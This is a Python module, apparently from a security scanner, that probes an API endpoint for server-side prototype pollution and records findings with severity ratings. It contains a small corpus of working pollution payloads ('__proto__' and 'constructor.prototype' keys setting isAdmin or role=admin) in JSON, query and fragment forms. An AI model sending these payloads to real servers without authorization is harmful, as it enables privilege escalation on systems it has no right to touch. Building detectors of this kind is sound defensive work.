"""U-DEEP-14 — Prototype Pollution.

Family: PROTOTYPE_POLLUTION. Detection principle: STATE OVER STRING —
a finding requires the privileged key to actually appear in server
state (immediately in the probe response, or on a clean follow-up when
the pollution is persistent), never a mere echo of the payload. The
server-side corpus (``__proto__`` / ``constructor.prototype``) is
probed for state change; the client-side surfaces (query / fragment /
JSON) are documented for operator-led verification.

Zero live network: the transport is the injected
``send(endpoint, body)`` callable; findings are advisory evidence only
(DEEP-L-8 ADVISORY_ONLY).
"""
from __future__ import annotations

import json
from dataclasses import dataclass

# Spec corpus, verbatim structure (U-DEEP-14): four groups.
PROTOTYPE_POLLUTION_PAYLOADS: dict[str, list] = {
    "server_side": [
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"isAdmin": True, "role": "admin"}},
    ],
    "client_query": [
        "?__proto__[isAdmin]=true",
        "?constructor[prototype][isAdmin]=true",
        "?__proto__[role]=admin",
    ],
    "client_fragment": [
        "#__proto__[isAdmin]=true",
    ],
    "client_json": [
        '{"__proto__": {"isAdmin": true}}',
    ],
}

SEVERITY_BY_SUBFAMILY = {
    "server_side": "high",
    "server_side_persistent": "critical",
    "client_query": "medium",
    "client_fragment": "medium",
    "client_json": "medium",
}


@dataclass(frozen=True)
class PrototypePollutionFinding:
    subfamily: str
    severity: str
    evidence: tuple[str, ...]
    payload: dict
    family: str = "PROTOTYPE_POLLUTION"
    confidence: float = 0.9
    statement: str = ""
    success_indicator: str = ""


class PrototypePollutionDetector:
    """Probes the server-side corpus against a clean state baseline and
    distinguishes immediate pollution from persistent pollution."""

    _ENDPOINT = "/api/profile"

    def __init__(self, send) -> None:
        self._send = send

    # ------------------------------------------------------------------

    def scan(self) -> list[PrototypePollutionFinding]:
        baseline = self._send(self._ENDPOINT, None)
        baseline_state = self._state(baseline)
        baseline_keys = set(baseline_state)
        baseline_line = (
            f"baseline: {json.dumps(baseline_state, sort_keys=True)}")
        findings: list[PrototypePollutionFinding] = []
        for payload in PROTOTYPE_POLLUTION_PAYLOADS["server_side"]:
            probe = self._send(self._ENDPOINT, payload)
            new_keys = set(self._state(probe)) - baseline_keys
            if new_keys:
                findings.append(self._finding(
                    "server_side", payload, baseline_line, probe, new_keys))
                continue
            follow = self._send(self._ENDPOINT, None)
            follow_keys = set(self._state(follow)) - baseline_keys
            if follow_keys:
                findings.append(self._finding(
                    "server_side_persistent", payload, baseline_line,
                    follow, follow_keys))
        return findings

    # ------------------------------------------------------------------

    @staticmethod
    def _state(response) -> dict:
        state = response.json()
        return state if isinstance(state, dict) else {}

    def _finding(self, subfamily: str, payload: dict, baseline_line: str,
                 probe, new_keys: set) -> PrototypePollutionFinding:
        if subfamily == "server_side_persistent":
            statement = (
                "Prototype pollution persisted beyond the probe request: "
                "the privileged key appeared on a clean follow-up — "
                "server-side prototype pollution (advisory; verify "
                "against an authorized target).")
            success_indicator = (
                "privileged key present in server state on a clean "
                "follow-up request after the probe")
        else:
            statement = (
                "Prototype pollution flipped privileged server state in "
                "the probe response itself — server-side prototype "
                "pollution (advisory; verify against an authorized "
                "target).")
            success_indicator = (
                "privileged key present in server state where the "
                "baseline had none")
        return PrototypePollutionFinding(
            subfamily=subfamily,
            severity=SEVERITY_BY_SUBFAMILY[subfamily],
            evidence=(
                baseline_line,
                f"probe: {json.dumps(self._state(probe), sort_keys=True)}",
                f"polluted keys: {sorted(new_keys)}",
            ),
            payload=payload,
            statement=statement,
            success_indicator=success_indicator,
        )
